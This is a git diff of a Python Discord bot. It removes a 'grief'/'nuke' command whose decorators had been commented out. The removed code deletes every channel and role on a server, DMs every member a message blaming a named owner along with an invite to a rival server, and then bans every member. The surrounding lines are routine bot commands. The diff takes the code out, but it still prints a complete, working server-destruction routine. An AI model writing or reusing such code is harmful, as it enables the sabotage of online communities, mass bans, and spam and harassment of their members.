@@ -303,46 +303,6 @@ async def guilds(ctx):
         await ctx.send(f"{guild.name}: \nOwner: {guild.owner.name} \n# of Members: {guild.member_count}")
 
 
-#@bot.command(aliases=['nuke'])
-#@commands.is_owner()
-async def grief(ctx):
-    await ctx.send("Sir, are you sure you want to grief this server?")
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel
-    msg = await bot.wait_for('message', timeout=60, check=check)
-    if msg.content == "y":
-        await ctx.send("Ready to grief. This will destory all text channels, voice channels, role, and kick everyone on this server. Standing by. Awaiting order to begin")
-        msg = await bot.wait_for('message', timeout=60, check=check)
-        if msg.content == "begin":
-            for category in ctx.guild.categories:
-                await category.delete()
-            for channel in ctx.guild.channels:
-                if channel != ctx.channel:
-                    await channel.delete()
-            await ctx.send("All channels deleted")
-            for role in ctx.guild.roles:
-                try:
-                    await role.delete()
-                except Exception:
-                    pass
-            await ctx.send("All roles deleted")
-            for member in ctx.guild.members:
-                try:
-                    dm = await member.create_dm()
-                    await dm.send(f"VanillaMC has been destroyed because coolkidmacho is a terrible owner. Come join this server where we will host Hypixel Nights and Among Us but we have good owners :) https://discord.gg/GATm9tXesQ")
-                except Exception:
-                    pass
-                try:
-                    await member.ban()
-                except Exception:
-                    pass
-            await ctx.send("Operation successful.")
-        else:
-            await ctx.send("cancelled")
-    else:
-        await ctx.send("cancelled.")
-
-
 @bot.command()
 @commands.is_owner()
 async def dm(ctx, args, message):
